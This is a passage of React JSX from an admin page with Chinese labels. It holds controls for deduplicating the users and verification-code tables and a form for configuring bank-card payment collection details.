                  <div style={{ fontWeight: 'bold', color: '#fff', marginBottom: '8px' }}>用户表（users）</div>
                  <div style={{ fontSize: '14px', color: '#b0b0b0' }}>
                    总记录数：{dedupStats.users.total} · 重复手机号组数：{dedupStats.users.duplicatePhones} · 可删除重复条数：{dedupStats.users.duplicateCount}
                  </div>
                  <button
                    type="button"
                    disabled={dedupLoading || dedupStats.users.duplicateCount === 0}
                    onClick={() => runDedup('users')}
                    style={{ marginTop: '12px', padding: '8px 20px', background: dedupStats.users.duplicateCount === 0 ? '#333' : '#667eea', color: '#fff', border: 'none', borderRadius: '4px', cursor: dedupStats.users.duplicateCount === 0 ? 'not-allowed' : 'pointer', fontSize: '14px' }}
                  >
                    {dedupLoading ? '处理中...' : '执行用户表去重'}
                  </button>
                </div>
                <div style={{ padding: '16px', background: '#1a1a1a', border: '1px solid #404040', borderRadius: '8px' }}>
                  <div style={{ fontWeight: 'bold', color: '#fff', marginBottom: '8px' }}>验证码表（verification_codes）</div>
                  <div style={{ fontSize: '14px', color: '#b0b0b0' }}>
                    总记录数：{dedupStats.verification_codes.total} · 可删除重复条数：{dedupStats.verification_codes.duplicateCount}
                  </div>
                  <button
                    type="button"
                    disabled={dedupLoading || dedupStats.verification_codes.duplicateCount === 0}
                    onClick={() => runDedup('verification_codes')}
                    style={{ marginTop: '12px', padding: '8px 20px', background: dedupStats.verification_codes.duplicateCount === 0 ? '#333' : '#667eea', color: '#fff', border: 'none', borderRadius: '4px', cursor: dedupStats.verification_codes.duplicateCount === 0 ? 'not-allowed' : 'pointer', fontSize: '14px' }}
                  >
                    {dedupLoading ? '处理中...' : '执行验证码表去重'}
                  </button>
                </div>
              </div>
            ) : (
              <div style={{ color: '#b0b0b0', fontSize: '14px' }}>点击「刷新统计」加载去重统计</div>
            )}
          </div>
        ) : (
          <div>
            <h2 style={{ marginBottom: '20px', fontSize: '18px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
              收款方式配置
            </h2>

            {loading ? (
              <div style={{ textAlign: 'center', padding: '40px', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif', fontWeight: 'bold' }}>
                加载中...
              </div>
            ) : (
              <div style={{ display: 'grid', gap: '30px' }}>
                {paymentMethods.map((method, index) => (
                  <div
                    key={index}
                    style={{
                      padding: '20px',
                      border: '1px solid #404040',
                      borderRadius: '4px',
                      background: '#3d3d3d'
                    }}
                  >
                    <h3 style={{ marginBottom: '20px', fontSize: '16px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                      收款方式
                    </h3>

                    <div style={{ display: 'grid', gap: '15px' }}>
                      <div>
                        <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                          *收款类型
                        </label>
                        <select
                          value={method.type}
                          onChange={(e) => updatePaymentMethod(index, 'type', e.target.value)}
                          style={{
                            width: '100%',
                            padding: '8px 12px',
                            border: '1px solid #404040',
                            borderRadius: '4px',
                            boxSizing: 'border-box',
                            background: '#1a1a1a',
                            color: '#ffffff',
                            fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
                            fontWeight: 'bold'
                          }}
                        >
                          <option value="银行卡一" style={{ background: '#1a1a1a', color: '#ffffff' }}>银行卡一</option>
                          <option value="银行卡二" style={{ background: '#1a1a1a', color: '#ffffff' }}>银行卡二</option>
                        </select>
                      </div>

                      <div>
                        <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                          银行卡名称
                        </label>
                        <input
                          type="text"
                          value={method.bank_name}
                          onChange={(e) => updatePaymentMethod(index, 'bank_name', e.target.value)}
                          placeholder="请输入银行卡名称"
                          style={{
                            width: '100%',
                            padding: '8px 12px',
                            border: '1px solid #404040',
                            borderRadius: '4px',
                            boxSizing: 'border-box',
                            background: '#1a1a1a',
                            color: '#ffffff',
                            fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
                            fontWeight: 'bold'
                          }}
                        />
                      </div>

                      <div>
                        <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                          收款人姓名
                        </label>
                        <input
                          type="text"
                          value={method.payee_name}
                          onChange={(e) => updatePaymentMethod(index, 'payee_name', e.target.value)}
                          placeholder="请输入收款人姓名"
                          style={{
                            width: '100%',
                            padding: '8px 12px',
                            border: '1px solid #404040',
                            borderRadius: '4px',
                            boxSizing: 'border-box',
                            background: '#1a1a1a',
                            color: '#ffffff',
                            fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
                            fontWeight: 'bold'
                          }}
                        />
                      </div>

                      <div>
                        <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#ffffff', fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif' }}>
                          银行卡号
                        </label>
                        <input
                          type="text"
                          value={method.card_number}
                          onChange={(e) => updatePaymentMethod(index, 'card_number', e.target.value)}
                          placeholder="请输入银行卡号"
                          style={{
                            width: '100%',
                            padding: '8px 12px',
                            border: '1px solid #404040',
                            borderRadius: '4px',
                            boxSizing: 'border-box',
                            background: '#1a1a1a',
                            color: '#ffffff',
                            fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif',
                            fontWeight: 'bold'
                          }}
                        />
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}

            {/* 保存按钮 */}
            <div style={{
              marginTop: '30px',
              display: 'flex',
              justifyContent: 'flex-end',
              gap: '10px'
            }}>
              <button
                onClick={handleSave}
                disabled={loading}
                style={{
                  padding: '10px 30px',
                  background: loading ? '#3d3d3d' : '#667eea',
                  color: '#fff',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: loading ? 'not-allowed' : 'pointer',
                  fontSize: '14px',
                  fontWeight: 'bold',
                  fontFamily: 'PingFang SC, -apple-system, BlinkMacSystemFont, sans-serif'
                }}
              >
                {loading ? '保存中...' : '保存'}
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
